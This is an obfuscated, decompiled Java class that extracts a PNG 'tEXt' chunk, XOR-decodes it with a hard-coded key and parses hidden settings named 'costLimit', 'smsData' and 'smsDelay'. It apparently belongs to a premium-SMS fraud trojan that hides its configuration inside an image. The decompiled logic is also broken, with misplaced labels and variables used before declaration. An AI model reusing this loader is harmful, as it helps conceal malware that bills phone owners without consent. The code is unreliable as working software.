package com.termate;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.Hashtable;

public final class a
{
  public String[] a = null;
  public String[] b = null;
  public int[] c = null;
  public int d = 0;
  public int e = 0;
  public String f;
  public Hashtable g = new Hashtable();
  private int h = 2;
  
  public a() {}
  
  private static int a(byte[] paramArrayOfByte1, byte[] paramArrayOfByte2)
  {
    int k = paramArrayOfByte1.length;
    int i = 0;
    if (i < k) {
      if (paramArrayOfByte1[i] == paramArrayOfByte2[0])
      {
        j = 1;
        label23:
        if (j >= paramArrayOfByte2.length) {
          break label64;
        }
        if (paramArrayOfByte1[(i + j)] == paramArrayOfByte2[j]) {}
      }
    }
    label64:
    for (int j = 0;; j = 1)
    {
      if (j != 0)
      {
        return i;
        j += 1;
        break label23;
      }
      i += 1;
      break;
      return -1;
    }
  }
  
  public final boolean a(InputStream paramInputStream)
  {
    int j = 0;
    Object localObject = new ByteArrayOutputStream();
    byte[] arrayOfByte = new byte[100];
    for (;;)
    {
      i = paramInputStream.read(arrayOfByte);
      if (i == -1) {
        break;
      }
      ((ByteArrayOutputStream)localObject).write(arrayOfByte, 0, i);
    }
    paramInputStream = ((ByteArrayOutputStream)localObject).toByteArray();
    int i = a(paramInputStream, new byte[] { 116, 69, 88, 116 });
    if (i < 0) {
      throw new IOException("Chank tEXt not found in png");
    }
    i -= 4;
    int k = new DataInputStream(new ByteArrayInputStream(new byte[] { paramInputStream[i], paramInputStream[(i + 1)], paramInputStream[(i + 2)], paramInputStream[(i + 3)] })).readInt() - 9;
    localObject = new byte[k];
    System.arraycopy(paramInputStream, i + 17, localObject, 0, k);
    paramInputStream = new DataInputStream(new ByteArrayInputStream((byte[])localObject));
    localObject = new ByteArrayOutputStream();
    i = 0;
    for (;;)
    {
      k = (byte)paramInputStream.read();
      if (k == -1) {
        break;
      }
      ((ByteArrayOutputStream)localObject).write((byte)(k ^ "f_+wqlfh4 @312!@#DSAD fh8w3hf43f@#$! r43".charAt(i % "f_+wqlfh4 @312!@#DSAD fh8w3hf43f@#$! r43".length())));
      i += 1;
    }
    paramInputStream = new DataInputStream(new ByteArrayInputStream(((ByteArrayOutputStream)localObject).toByteArray()));
    k = paramInputStream.readShort();
    this.a = new String[k];
    this.b = new String[k];
    this.c = new int[k];
    i = 0;
    while (i < k)
    {
      this.b[i] = paramInputStream.readUTF();
      this.a[i] = paramInputStream.readUTF();
      this.c[i] = paramInputStream.readShort();
      i += 1;
    }
    k = paramInputStream.readShort();
    i = j;
    for (;;)
    {
      if (i < k)
      {
        try
        {
          localObject = paramInputStream.readUTF();
          if (((String)localObject).equals("costLimit")) {
            this.d = Integer.parseInt(paramInputStream.readUTF());
          } else if (((String)localObject).equals("costLimitPeriod")) {
            this.e = Integer.parseInt(paramInputStream.readUTF());
          }
        }
        catch (IOException localIOException)
        {
          localIOException.printStackTrace();
          break label485;
          if (localIOException.equals("smsData")) {
            this.f = paramInputStream.readUTF();
          }
        }
        catch (NumberFormatException localNumberFormatException)
        {
          localNumberFormatException.printStackTrace();
        }
        if (localNumberFormatException.equals("smsDelay")) {
          this.h = Integer.parseInt(paramInputStream.readUTF());
        } else {
          this.g.put(localNumberFormatException, paramInputStream.readUTF());
        }
      }
      else
      {
        return true;
      }
      label485:
      i += 1;
    }
  }
}
